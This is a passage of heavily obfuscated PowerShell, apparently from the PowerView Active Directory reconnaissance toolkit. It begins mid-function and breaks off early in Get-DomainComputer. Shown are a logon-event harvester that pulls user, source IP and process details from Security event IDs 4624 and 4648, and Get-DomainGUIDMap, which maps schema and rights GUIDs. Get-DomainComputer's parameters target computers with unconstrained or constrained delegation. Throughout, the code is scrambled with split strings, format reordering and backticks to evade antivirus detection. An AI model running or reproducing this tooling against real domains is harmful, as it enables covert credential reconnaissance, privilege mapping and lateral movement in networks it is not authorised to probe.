        ${c`R`edENtIAl} =  ${p`kFE`Zn}::"e`mptY"
    )

    BEGIN {

        ${xPAtHf`i`Lter} = ((('b'+'BM
<Q'+'uer'+'yList'+'>
 ') -rEpLAce([cHar]98+[cHar]66+[cHar]77),[cHar]34)+' '+' '+' '+'<Quer'+'y '+('Id='+'NjE0NjE'+' ')."re`P`lACe"('NjE',[string][cHAR]34)+(('Pa'+'th=J'+'5iSecuri'+'tyJ5i>
'+'
 ')-rEPLACe 'J5i',[CHar]34)+' '+' '+' '+' '+' '+' '+' '+'<!'+'-- '+'Log'+'on'+' '+'even'+'ts '+'-->'+'
 '+' '+' '+' '+' '+' '+' '+' '+'<Sele'+'ct '+('Pa'+'th'+'='+'{0}Security'+'{'+'0}>
 ') -f[CHar]34+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'*'+'[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'Sy'+'stem['+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'P'+'rovide'+'r[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('@'+'Na'+'me'+'='+'{'+'0}Micros'+'oft'+'-'+'Win'+'do'+'ws'+'-Se'+'curity-Aud'+'i'+'ting{0}
'+' ') -f  [CHaR]39+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'an'+'d '+'(Le'+'ve'+'l=4 '+'o'+'r '+'Level'+'=0'+')'+' '+'and'+' '+'(Ev'+'entID=4624)'+''+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'an'+'d '+'Ti'+'meCre'+'at'+'ed'+'[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+(('@SystemTi'+'me'+'&g'+'t;=UAYj'+'c'+'J('+'jcJ'+'S'+'t'+'art'+'Ti'+'me.T'+'oUni'+'vers'+'alTime().'+'ToStr'+'i'+'n'+'g'+'(UAY'+'sU'+'AY'+'))'+'UAY ') -replaCe'UAY',[CHar]39  -crEPLACE'jcJ',[CHar]36)+'and'+' '+(('@S'+'ystemT'+'ime'+'&lt;=0b'+'ko'+'G'+'B'+'('+'o'+'GB'+'EndTi'+'me'+'.'+'ToUniversalTime().ToStr'+'ing(0bks0bk))0bk'+''+'
 ')-replaCE  ([chaR]48+[chaR]98+[chaR]107),[chaR]39-CrEpLACe  ([chaR]111+[chaR]71+[chaR]66),[chaR]36)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'and'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('*[Event'+'Data[D'+'ata[@Name={0}'+'Target'+'Us'+'erName'+'{0}] ')-F  [ChaR]39+'!'+'= '+('{0'+'}'+'ANONY'+'MOU'+'S ')  -F  [chaR]39+(('LOGONE'+'T'+'7]'+']
 ') -CreplACe 'ET7',[cHar]39)+' '+' '+' '+' '+' '+' '+' '+'<'+'/'+'Select>

 '+' '+' '+' '+' '+' '+' '+' '+'<!--'+' '+'Lo'+'gon'+' '+'w'+'ith '+'e'+'x'+'plicit '+'cred'+'entia'+'l '+'e'+'vents '+'--'+'>
 '+' '+' '+' '+' '+' '+' '+' '+'<'+'Select '+(('Path=nVkSecu'+'ri'+'tynV'+'k>
 ')  -cRePlaCE 'nVk',[chAR]34)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'*'+'[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'System'+'[
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'Provi'+'der'+'[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+(('@Name'+'='+'V'+'0DMicrosoft'+'-Win'+'do'+'ws-Secu'+'rity-A'+'uditi'+'ngV0D
 ')  -rEPlACE  'V0D',[CHAR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'an'+'d '+'(Lev'+'e'+'l=4 '+'o'+'r '+'Leve'+'l=0'+')'+' '+'a'+'nd '+'('+'Event'+'ID'+'=4648)
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'an'+'d '+'TimeCr'+'ea'+'ted['+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('@S'+'ys'+'te'+'m'+'Ti'+'m'+'e&gt;={0'+'}{1'+'}({1}St'+'art'+'Time.T'+'oUniversalT'+'ime()'+'.'+'ToStr'+'i'+'ng({'+'0}s{0}))'+'{0}'+' ')  -F  [CHAR]39,[CHAR]36+'a'+'nd '+('@'+'Sy'+'st'+'e'+'mTime&'+'l'+'t;=Iv'+'i60S(60S'+'EndT'+'i'+'me'+'.'+'To'+'Univers'+'al'+'T'+'ime().ToStrin'+'g'+'(IvisIvi))'+'I'+'v'+'i
'+' ')."REPLa`cE"(([cHar]73+[cHar]118+[cHar]105),[sTrInG][cHar]39)."rE`placE"(([cHar]54+[cHar]48+[cHar]83),'$')+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+'</'+'Select>
'+'
'+' '+' '+' '+' '+' '+' '+' '+' '+'<'+'Su'+'ppress '+('Path={0}'+'Se'+'curity'+'{0}>
 ')  -F  [CHar]34+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'*['+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'Syst'+'e'+'m['+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'Provi'+'der'+'['+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('@'+'Na'+'m'+'e'+'=4ItMicros'+'of'+'t-Windo'+'ws-Securi'+'ty-Audi'+'ting4It
 ')."R`eP`LacE"('4It',[sTrinG][ChaR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'and
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'(Leve'+'l=4'+' '+'or'+' '+'Lev'+'el=0)'+' '+'and'+' '+'(Event'+'ID='+'462'+'4 '+'or'+' '+'Eve'+'ntID='+'4625'+' '+'or'+' '+'Eve'+'ntID=4634)'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'and'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'*'+'[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'E'+'ventDa'+'ta'+'[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'('+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('(D'+'ata['+'@N'+'ame={0'+'}LogonTy'+'pe{0}]={0}5{0}'+' ')-F  [chAR]39+'o'+'r '+('Da'+'ta[@N'+'ame'+'='+'se4Logo'+'nTypes'+'e4]=se40se4)'+'
'+' ')."r`EP`lACe"(([chAR]115+[chAR]101+[chAR]52),[STRINg][chAR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'or'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('D'+'a'+'t'+'a[@Name={0}Targ'+'etUser'+'Name{0'+'}]={0}ANO'+'NYMOUS ') -f [cHAr]39+(('LO'+'GONg'+'2I'+'
 ')-crEpLACe'g2I',[cHAr]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'or
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+(('Da'+'t'+'a['+'@Nam'+'e=Km'+'8TargetU'+'serSID'+'Km8]=Km8S-'+'1-'+'5-18Km8'+'
 ')-cRePLACE([CHar]75+[CHar]109+[CHar]56),[CHar]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+')'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+'<'+'/Sup'+'pre'+'ss'+'>
 '+' '+' '+' '+('</'+'Query>'+''+'
</Q'+'u'+'e'+'ryLi'+'st>
{0}') -f  [chAR]34)
        ${EVen`Tar`gUm`eNTs} = @{
            ("{2}{0}{1}" -f 'er','XPath','Filt') = ${xPAth`FI`LT`ER}
            ("{0}{1}{2}"-f 'Lo','gN','ame') = ("{0}{2}{1}"-f 'S','ity','ecur')
            ("{0}{1}{2}"-f 'MaxEven','t','s') = ${ma`X`EvENts}
        }
        if (${psboun`d`pa`R`AMeTers}[("{2}{0}{3}{1}"-f 'd','l','Cre','entia')]) { ${eVEntAR`g`U`mENtS}[("{1}{2}{0}"-f 'l','Cre','dentia')] = ${c`Red`eNT`IaL} }
    }

    PROCESS {
        ForEach (${cOmP`UT`er} in ${CompUtE`RN`AMe}) {

            ${evenT`ARguM`ENTs}[("{1}{0}{2}" -f 'put','Com','erName')] = ${cO`MP`U`Ter}

            &("{3}{2}{0}{1}"-f 'en','t','nEv','Get-Wi') @EventArguments| &("{0}{2}{1}"-f 'For','ject','Each-Ob') {
                ${eVe`NT} = ${_}
                ${PRoP`e`RT`Ies} = ${E`VenT}."Pr`OPeR`TIES"
                Switch (${Eve`Nt}."ID") {

                    4624 {

                        if(-not ${p`RoPer`TieS}[5]."vaL`Ue".("{0}{1}" -f'EndsWit','h').Invoke('$')) {
                            ${OuTp`Ut} = &("{1}{2}{0}"-f't','New','-Objec') ("{2}{1}{0}"-f 'ject','SOb','P') -Property @{
                                ("{2}{0}{1}"-f'erNam','e','Comput')              = ${com`PUTer}
                                ("{2}{0}{1}"-f'Cr','eated','Time')               = ${ev`e`Nt}."TiM`ECR`EA`Ted"
                                ("{1}{0}{2}" -f'ventI','E','d')                   = ${ev`ent}."iD"
                                ("{2}{0}{1}"-f 'ubjectU','serSid','S')            = ${P`Rop`erT`iES}[0]."V`ALUE".("{1}{0}{2}"-f 'oStri','T','ng').Invoke()
                                ("{3}{0}{4}{1}{2}"-f'ubject','m','e','S','UserNa')           = ${PRo`p`ertIEs}[1]."Val`UE"
                                ("{0}{1}{3}{4}{2}"-f'Subj','ectD','Name','o','main')         = ${pROP`e`R`TIes}[2]."Va`luE"
                                ("{3}{4}{2}{0}{1}" -f 'go','nId','ectLo','Su','bj')            = ${P`ROp`eRtieS}[3]."V`AlUE"
                                ("{1}{3}{4}{2}{0}" -f 'd','Tar','erSi','ge','tUs')             = ${pR`o`per`TiES}[4]."VA`LUe".("{1}{0}"-f'ng','ToStri').Invoke()
                                ("{3}{2}{0}{1}" -f'er','Name','rgetUs','Ta')            = ${pRopE`RTI`Es}[5]."val`Ue"
                                ("{1}{3}{2}{0}"-f'ame','TargetDo','N','main')          = ${PrOP`e`RTiEs}[6]."V`AlUe"
                                ("{1}{2}{0}" -f'etLogonId','Tar','g')             = ${PrO`P`er`TIES}[7]."Val`UE"
                                ("{1}{0}{2}"-f'T','Logon','ype')                 = ${PR`oPe`RtIes}[8]."v`Alue"
                                ("{1}{0}{2}"-f 'oces','LogonPr','sName')          = ${Pr`oper`TI`Es}[9]."V`AluE"
                                ("{1}{0}{6}{5}{3}{4}{2}" -f 'u','A','Name','ac','kage','ticationP','then') = ${PRo`pE`RTIES}[10]."v`AlUe"
                                ("{1}{2}{0}{3}" -f 'nNam','Worksta','tio','e')           = ${PRo`p`eRtIeS}[11]."v`ALUe"
                                ("{0}{2}{1}" -f 'L','d','ogonGui')                 = ${pro`P`ErTies}[12]."Va`Lue"
                                ("{5}{2}{1}{3}{4}{0}"-f's','er','ransmittedS','vi','ce','T')       = ${pr`opeR`TIeS}[13]."v`ALUe"
                                ("{3}{0}{1}{2}"-f 'a','ckag','eName','LmP')             = ${Pro`Pe`Rti`es}[14]."VAl`Ue"
                                ("{0}{1}{2}"-f 'K','eyLengt','h')                 = ${Pr`oPer`TiEs}[15]."va`lue"
                                ("{1}{0}{2}" -f'ss','Proce','Id')                 = ${pRoP`ER`Ti`eS}[16]."v`ALUE"
                                ("{1}{2}{3}{0}"-f 'essName','P','r','oc')               = ${Pr`OP`eRtI`es}[17]."Va`LUe"
                                ("{0}{2}{1}{3}"-f'I','ddres','pA','s')                 = ${p`ROpE`R`TIes}[18]."V`AlUE"
                                ("{0}{1}" -f 'IpPo','rt')                    = ${PR`ope`RT`Ies}[19]."vAl`UE"
                                ("{2}{3}{0}{1}"-f 'on','Level','Imperso','nati')        = ${pR`OpER`Ties}[20]."Va`lUe"
                                ("{1}{0}{4}{2}{3}{5}"-f 'es','R','ictedA','dminM','tr','ode')       = ${PrOP`eR`T`Ies}[21]."vA`lue"
                                ("{0}{2}{1}{4}{3}" -f'Tar','OutboundUs','get','ame','erN')    = ${PRop`eRT`IEs}[22]."Val`UE"
                                ("{1}{4}{0}{5}{6}{3}{2}"-f'b','TargetOu','me','a','t','oundDom','ainN')  = ${proP`ER`TIES}[23]."va`LuE"
                                ("{1}{2}{0}"-f 't','VirtualA','ccoun')            = ${p`ROPeRt`IEs}[24]."VAL`Ue"
                                ("{0}{3}{1}{2}" -f'Target','inkedLog','onId','L')       = ${Pr`Op`E`RTIEs}[25]."val`Ue"
                                ("{0}{4}{3}{1}{2}" -f'Eleva','To','ken','d','te')             = ${prOPe`Rt`IEs}[26]."Va`lue"
                            }
                            ${OUt`put}."Pso`B`JecT"."tyPE`NaMEs".("{1}{0}"-f'sert','In').Invoke(0, ("{5}{1}{0}{2}{4}{3}" -f'werV','o','ie','gonEvent','w.Lo','P'))
                            ${oU`T`Put}
                        }
                    }

                    4648 {

                        if((-not ${pROPeR`T`i`es}[5]."vAl`Ue".("{1}{0}" -f'h','EndsWit').Invoke('$')) -and (${P`ROpER`TieS}[11]."v`ALUe" -match ((("{2}{0}{1}{4}{3}" -f 'ask','ho','t','exe','st6WB.'))-rEPlAce  '6WB',[cHaR]92))) {
                            ${oUtP`UT} = &("{0}{1}{2}{3}"-f'New-','Ob','jec','t') ("{0}{2}{1}"-f'P','ject','SOb') -Property @{
                                ("{3}{1}{0}{2}"-f'e','mput','rName','Co')              = ${coM`puteR}
                                ("{1}{0}{2}"-f'meCre','Ti','ated')       = ${Ev`ENt}."ti`mE`cRE`ATeD"
                                ("{1}{0}" -f 'tId','Even')           = ${E`V`eNt}."I`D"
                                ("{4}{0}{1}{3}{2}"-f'b','j','ctUserSid','e','Su')    = ${pr`operT`iEs}[0]."v`AlUe".("{0}{1}{2}"-f 'T','oSt','ring').Invoke()
                                ("{2}{0}{3}{1}"-f'ubjectU','Name','S','ser')   = ${PrOpErt`I`Es}[1]."vAL`UE"
                                ("{2}{1}{0}{3}" -f 'm','tDomainNa','Subjec','e') = ${PROpE`Rt`iES}[2]."V`ALUe"
                                ("{2}{3}{1}{0}"-f'ogonId','tL','Subje','c')    = ${Pr`oPE`R`TIeS}[3]."V`ALuE"
                                ("{2}{1}{0}" -f 'onGuid','og','L')         = ${P`RopERTI`ES}[4]."Val`UE".("{1}{0}" -f 'String','To').Invoke()
                                ("{4}{3}{1}{2}{0}" -f 'me','etUser','Na','rg','Ta')    = ${propE`RT`IES}[5]."val`UE"
                                ("{2}{3}{1}{4}{0}" -f 'ainName','o','Tar','getD','m')  = ${pRopE`R`TI`ES}[6]."Va`lUE"
                                ("{0}{4}{1}{3}{2}" -f 'Targ','tLo','uid','gonG','e')   = ${p`ROP`eRt`IES}[7]."VaL`UE"
                                ("{0}{1}{3}{2}"-f 'TargetS','e','ame','rverN')  = ${pRoPE`Rt`IEs}[8]."va`lUe"
                                ("{2}{1}{0}"-f'o','rgetInf','Ta')        = ${pRo`p`ertiES}[9]."VAL`UE"
                                ("{0}{1}" -f'ProcessI','d')         = ${pro`peR`TI`ES}[10]."v`AlUe"
                                ("{1}{2}{0}" -f 'ssName','P','roce')       = ${PROPErT`i`eS}[11]."Va`LUE"
                                ("{0}{1}{2}"-f 'I','p','Address')         = ${PRO`PERt`I`es}[12]."va`LUe"
                                ("{1}{0}" -f 'Port','Ip')            = ${p`RO`PErTiES}[13]."VaL`UE"
                            }
                            ${Ou`Tput}."P`SOBJe`ct"."T`yPE`NAmES".("{1}{0}"-f'rt','Inse').Invoke(0, ("{7}{2}{8}{6}{9}{4}{1}{3}{0}{5}{10}"-f'v','ogo','xpl','nE','entialL','e','cit','PowerView.E','i','Cred','nt'))
                            ${o`Ut`puT}
                        }
                    }
                    ("{0}{1}"-f 'defau','lt') {
                        &("{0}{2}{1}{3}" -f'Writ','Warni','e-','ng') "No handler exists for event ID: $($Event.Id) "
                    }
                }
            }
        }
    }
}

function get-DomaiN`G`Ui`DmaP {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{2}{0}{1}"-f'oces','s','r','PSShouldP'}, '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        ${D`oMa`IN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{2}{1}{0}{4}"-f 'ntro','o','nC','Domai','ller'})]
        [String]
        ${S`Er`Ver},

        [ValidateRange(1, 10000)]
        [Int]
        ${rE`sUlt`PaGeSIZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${Se`R`VeR`TImeLImIT},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`RE`De`NTiAL} =   (  &("{1}{2}{0}{3}"-f'Var','GeT','-','iaBle') ("PKFez"+"N") -VaLUEONl )::"EMP`Ty"
    )

    ${G`U`ids} = @{("{6}{1}{0}{2}{4}{5}{3}"-f'0000-0000-0','000-','0','00000','00','-0000000','00000') = 'All'}

    ${foRE`sT`Ar`g`UMenTS} = @{}
    if (${psBO`UndpaR`Amet`erS}[("{1}{2}{0}" -f 'l','Cr','edentia')]) { ${F`OrE`stARGu`meNTs}[("{1}{2}{0}" -f'dential','Cr','e')] = ${cr`ed`enTial} }

    try {
        ${sc`h`EMapa`TH} = (&("{1}{2}{0}"-f 'st','Get-For','e') @ForestArguments)."sCh`ema"."n`AMe"
    }
    catch {
        throw ("{8}{7}{1}{13}{6}{0}{5}{10}{12}{2}{3}{9}{4}{11}" -f 'etriev','p] Er',' f','rom','s','ing for','r','nGUIDMa','[Get-Domai',' Get-Fore','est sch','t','ema path','ror in ')
    }
    if (-not ${scH`Em`Apath}) {
        throw ("{10}{0}{3}{12}{7}{6}{11}{2}{9}{8}{5}{4}{1}"-f 'omainG','est','ng forest','UIDMa','r','et-Fo','ror in re',' Er','G',' schema path from ','[Get-D','trievi','p]')
    }

    ${SEarCh`Er`Ar`Gu`mENtS} = @{
        ("{0}{2}{1}"-f'SearchBa','e','s') = ${SCh`EmAP`ATH}
        ("{2}{1}{0}"-f 'PFilter','DA','L') = ("{1}{3}{0}{2}"-f'ma','(','IDGUID=*)','sche')
    }
    if (${P`sB`oUnd`parAM`eTERs}[("{1}{0}" -f 'main','Do')]) { ${se`Arch`E`RA`RGUMEn`Ts}[("{0}{1}" -f'D','omain')] = ${DomA`In} }
    if (${PsBOu`NDPa`Ra`metErs}[("{1}{0}"-f'rver','Se')]) { ${s`E`ArChe`RaRg`Ume`NTs}[("{0}{1}"-f 'Se','rver')] = ${s`eRVeR} }
    if (${p`S`BOU`NdP`ARAm`EtErs}[("{2}{1}{3}{0}" -f 'Size','esultP','R','age')]) { ${Searc`hERa`R`gUmENtS}[("{0}{1}{3}{2}{4}" -f'Re','su','P','lt','ageSize')] = ${R`es`ULTPAge`sI`ZE} }
    if (${P`sBOun`DpAR`Amet`ERS}[("{3}{0}{2}{1}"-f'e','t','rverTimeLimi','S')]) { ${seAr`CHera`RgUM`E`NtS}[("{3}{2}{1}{0}"-f 'it','rTimeLim','ve','Ser')] = ${S`ErVER`TIM`Eli`Mit} }
    if (${p`SB`ou`NDpAramE`Ters}[("{2}{1}{0}" -f 'ntial','e','Cred')]) { ${SeARCH`Erargu`mE`Nts}[("{1}{0}{2}" -f 'e','Cr','dential')] = ${c`ReD`eNtIaL} }
    ${sCH`eMaSE`A`RcHeR} = &("{5}{3}{0}{4}{1}{2}"-f 't-Doma','n','Searcher','e','i','G') @SearcherArguments

    if (${SChEm`ASE`ArCh`eR}) {
        try {
            ${ResUL`TS} = ${s`CH`e`masEaRCheR}.("{1}{0}" -f 'll','FindA').Invoke()
            ${r`E`sUlts} | &("{0}{2}{1}{3}"-f 'W','-Ob','here','ject') {${_}} | &("{1}{2}{0}{3}"-f'b','ForE','ach-O','ject') {
                ${G`UIdS}[(&("{0}{1}{2}" -f 'New-','Ob','ject') ("{1}{0}" -f 'uid','G') (,${_}."p`ROPERt`IEs"."Sch`emaI`dG`UiD"[0]))."G`Uid"] = ${_}."P`Rop`Er`TIeS"."n`Ame"[0]
            }
            if (${ReSU`l`Ts}) {
                try { ${RE`s`ULTS}.("{0}{1}" -f 'dispos','e').Invoke() }
                catch {
                    &("{1}{0}{3}{2}"-f'e-','Writ','se','Verbo') ('['+'Get'+'-D'+'om'+'ai'+'nGUIDMap]'+' '+'Er'+'ror '+'d'+'i'+'sposin'+'g '+'of'+' '+'the'+' '+'R'+'esults '+'object'+': '+"$_")
                }
            }
            ${sC`hEmASE`Arc`HER}.("{0}{1}"-f'dispo','se').Invoke()
        }
        catch {
            &("{2}{3}{0}{1}" -f 'te-Ve','rbose','W','ri') ('['+'Get-Do'+'mainG'+'UID'+'M'+'ap] '+'Err'+'or '+'in'+' '+'build'+'ing '+'GU'+'ID '+'m'+'ap: '+"$_")
        }
    }

    ${SEA`R`cH`erarGu`mENtS}[("{2}{1}{0}" -f 'rchBase','a','Se')] = ${SC`hE`MAPath}.("{0}{2}{1}" -f 're','lace','p').Invoke(("{2}{0}{1}" -f 'he','ma','Sc'),("{1}{2}{0}{3}" -f'-Right','Exte','nded','s'))
    ${SearCh`Erar`gu`Men`TS}[("{0}{1}{2}"-f'LD','APFi','lter')] = (("{7}{4}{1}{2}{5}{0}{9}{8}{6}{3}"-f 'Acc','Cl','as','t)','bject','s=control','igh','(o','R','ess'))
    ${rigH`TS`s`EarcH`er} = &("{1}{4}{2}{0}{3}" -f'e','Get-Domai','arch','r','nSe') @SearcherArguments

    if (${r`iG`HtS`S`earchEr}) {
        try {
            ${rEs`UltS} = ${rIGhtsSE`AR`CHeR}.("{1}{2}{0}" -f'll','F','indA').Invoke()
            ${re`SUL`TS} | &("{0}{2}{1}" -f 'W','-Object','here') {${_}} | &("{0}{3}{2}{1}"-f 'For','ject','ch-Ob','Ea') {
                ${G`UI`DS}[${_}."PrO`P`Erties"."r`IgH`TsGUid"[0].("{1}{0}" -f 'ing','toStr').Invoke()] = ${_}."Pr`OpeRti`eS"."N`AmE"[0]
            }
            if (${R`EsUL`Ts}) {
                try { ${REs`UL`TS}.("{0}{2}{1}"-f 'di','e','spos').Invoke() }
                catch {
                    &("{0}{3}{4}{1}{2}" -f'W','bos','e','r','ite-Ver') ('[G'+'e'+'t-Doma'+'in'+'GU'+'IDMap] '+'E'+'rror '+'d'+'ispos'+'ing '+'of'+' '+'t'+'he '+'Resu'+'l'+'ts '+'object'+': '+"$_")
                }
            }
            ${rIghTS`s`EA`RCHeR}.("{1}{0}{2}" -f'ispo','d','se').Invoke()
        }
        catch {
            &("{2}{0}{1}{3}" -f'rite-V','e','W','rbose') ('[G'+'et-Do'+'m'+'a'+'in'+'GUIDM'+'ap] '+'Err'+'or '+'i'+'n '+'buil'+'din'+'g '+'GU'+'ID '+'ma'+'p: '+"$_")
        }
    }

    ${gU`i`ds}
}

function Ge`T-`d`Oma`iNcoM`PuTeR {
    [OutputType({"{3}{1}{0}{4}{2}" -f'mp','View.Co','er','Power','ut'})]
    [OutputType({"{0}{3}{2}{4}{1}" -f'PowerView','Raw','ute','.Comp','r.'})]
    [CmdletBinding()]
    Param (
        [Parameter(pOSiTIOn = 0, valuEfROmpiPEliNE = ${Tr`Ue}, vaLuEFroMpiPeLinebypROpertyname = ${TR`UE})]
        [Alias({"{0}{3}{2}{1}"-f'S','tName','n','amAccou'}, {"{0}{1}" -f 'Nam','e'}, {"{3}{1}{0}{2}" -f'a','ostN','me','DNSH'})]
        [String[]]
        ${iD`entI`Ty},

        [Switch]
        ${uNCON`Str`Ai`Ned},

        [Switch]
        ${TrUSTE`dTo`AUTh},

        [Switch]
        ${prI`NT`ERS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{3}{4}{0}{5}{1}"-f'Pri','ame','S','er','vice','ncipalN'})]
        [String]
        ${S`pn},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Op`eR`ATi`NGsy`S`TEM},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Serv`ICE`pA`cK},

        [ValidateNotNullOrEmpty()]
        [String]
        ${s`iTEN`AMe},

        [Switch]
        ${p`ING},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`o`mAin},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f 'lter','Fi'})]
        [String]
        ${L`DaPF`iL`TeR},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pR`O`pEr`TieS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f 'h','ADSPat'})]
        [String]
        ${SEa`RChBa`se},

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{3}{0}{1}{2}" -f 'ain','Cont','roller','m','Do'})]
        [String]
        ${SE`R`VEr},

        [ValidateSet({"{1}{0}"-f 'e','Bas'}, {"{0}{2}{1}"-f'O','evel','neL'}, {"{2}{0}{1}" -f 'ubtre','e','S'})]
        [String]
        ${SEAr`Ch`Sc`OPE} = ("{2}{1}{0}" -f'tree','b','Su'),

        [ValidateRange(1, 10000)]
        [Int]
        ${ReSU`lTp`AGEsIzE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${s`erVeRT`I`mELI`mIT},

        [ValidateSet({"{1}{0}" -f 'cl','Da'}, {"{0}{1}" -f'Grou','p'}, {"{0}{1}" -f'N','one'}, {"{0}{1}" -f 'Owne','r'}, {"{0}{1}"-f 'Sac','l'})]
        [String]
        ${sE`C`UrityMasKs},

        [Switch]
        ${TO`MbsTO`NE},

        [Alias({"{1}{2}{0}"-f 'nOne','Re','tur'})]
        [Switch]
        ${fI`NDo`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cre`De`NTiaL} =  ${p`K`FEzN}::"eM`Pty",

        [Switch]
        ${r`AW}
    )

    DynamicParam {
        ${U`A`CVALUe`N`AMeS} =   ${CJI`6K1}::("{2}{0}{1}" -f'et','Names','G').Invoke(${u`AC`ENuM})

        ${uAC`VALueNA`mEs} = ${uAcVA`luE`Na`MES} | &("{3}{1}{2}{0}" -f 't','rEach-','Objec','Fo') {${_}; "NOT_$_"}

        &("{3}{1}{4}{2}{5}{0}" -f'r','-Dynam','m','New','icPara','ete') -Name ("{2}{1}{0}" -f 'lter','ACFi','U') -ValidateSet ${Uac`ValU`en`AMES} -Type ([array])
    }

    BEGIN {
        ${sE`ARchE`RarGuMen`TS} = @{}
        if (${ps`BOU`N`DP`Ara`mEteRS}[("{1}{0}"-f 'main','Do')]) { ${SEARCH`eRarg`UMEn`TS}[("{1}{0}" -f 'omain','D')] = ${D`OM`AiN} }
